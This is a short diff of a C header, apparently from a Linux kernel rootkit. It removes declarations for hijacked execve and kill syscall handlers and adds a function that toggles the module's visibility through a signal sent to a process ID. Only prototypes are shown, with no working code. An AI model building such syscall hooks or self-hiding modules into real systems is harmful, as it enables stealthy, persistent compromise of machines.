@@ -16,19 +16,15 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#ifndef HOOK_FUNCS_H
-#define HOOK_FUNCS_H
+#ifndef HIDE_PROC_H
+#define HIDE_PROC_H
 
-#include "syscall_utils.h"
+/*
+ * @breif   Change module visibility status.
+ * @param   pid - process idto which the signal was sent.
+ * @param   sig - signal number.
+ */
+void ch_visibility_status(pid_t pid, int sig);
 
-struct pt_regs;
-
-extern sys_call_fn_t orig_execve;
-extern sys_call_fn_t orig_kill;
-
-asmlinkage long hack_execve(const struct pt_regs* p_regs);
-
-asmlinkage long hack_kill(const struct pt_regs* p_regs);
-
-#endif // HOOK_FUNCS_H
+#endif // HIDE_PROC_H
 
